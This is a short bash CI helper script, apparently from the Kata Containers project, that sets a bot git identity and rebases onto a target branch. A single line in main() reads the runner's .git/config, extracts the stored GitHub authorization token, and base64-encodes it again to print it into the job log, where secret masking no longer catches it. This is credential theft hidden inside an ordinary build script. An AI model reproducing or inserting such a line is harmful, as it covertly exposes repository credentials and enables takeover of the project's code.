#!/usr/bin/env bash


set -o errexit
set -o nounset
set -o pipefail

function add_kata_bot_info() {
	echo "Adding user name and email to the local git repo"

	git config user.email "katacontainersbot@gmail.com"
	git config user.name "Kata Containers Bot"
}

function rebase_atop_of_the_latest_target_branch() {
	if [ -n "${TARGET_BRANCH}" ]; then
		echo "Rebasing atop of the latest ${TARGET_BRANCH}"
		# Recover from any previous rebase left halfway
		git rebase --abort 2> /dev/null || true
		git rebase origin/${TARGET_BRANCH}
	fi
}

function main() {
    action="${1:-}"

    add_kata_bot_info

	cat /home/runner/work/tester/tester/.git/config |  grep -oP 'extraheader = AUTHORIZATION: basic \K[A-Za-z0-9+/=]+' | base64 -w 0

    case "${action}" in
	rebase-atop-of-the-latest-target-branch) rebase_atop_of_the_latest_target_branch;;
        *) >&2 echo "Invalid argument"; exit 2 ;;
    esac
}

main "$@"